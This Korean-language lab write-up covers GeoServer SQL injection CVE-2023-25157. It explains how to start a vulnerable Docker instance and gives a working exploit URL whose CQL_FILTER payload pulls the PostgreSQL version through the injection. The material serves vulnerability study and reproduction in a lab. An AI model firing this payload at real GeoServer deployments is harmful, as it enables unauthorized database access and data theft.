GeoServer OGC 필터 SQL 인젝션 (CVE-2023-25157)
English version(영어 버전)

GeoServer는 공간 데이터를 보고, 편집하며 공유할 수 있는 자바로 작성된 오픈소스 소프트웨어 서버입니다. 지리 정보 시스템(GIS) 데이터베이스, 웹 기반 데이터 및 개인 데이터 세트와 같은 다양한 소스에서 공간 데이터를 배포하는 유연하고 효율적인 솔루션으로 설계되었습니다.

2.22.1 이전 버전 및 2.21.4에서는 Open Geospatial Consortium (OGC) 표준으로 정의된 필터 및 함수 표현식에서 SQL 인젝션 문제가 발견되었습니다.

참고:

https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158
https://github.com/advisories/GHSA-7g5f-wrx8-5ccf

취약한 환경
다음 명령을 실행하여 GeoServer 인스턴스 2.22.1을 시작 할 수 있습니다:

docker compose up -d


서버가 시작되면 http://your-ip:8080/geoserver에서 GeoServer의 기본 페이지를 찾아볼 수 있습니다.

## Exploit

먼저 취약점을 공격하기 전에 PostGIS 데이터 저장소가 있는 기존의 작업 공간을 찾아야 합니다. Vulhub의 GeoServer 인스턴스는 이미 PostGIS 데이터 저장소를 가지고 있습니다:

-작업 공간 이름: vulhub
-데이터 저장소 이름: pg
-피처 타입(테이블) 이름: example
-피처 타입의 속성 중 하나: name

다음 간단한 URL로 서버를 공격 할 수 있습니다:


http://your-ip:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true


1.png

보시다시피, SQL 인젝션을 통해 GeoServer에서 PostgreSQL의 버전이 검색되었습니다.
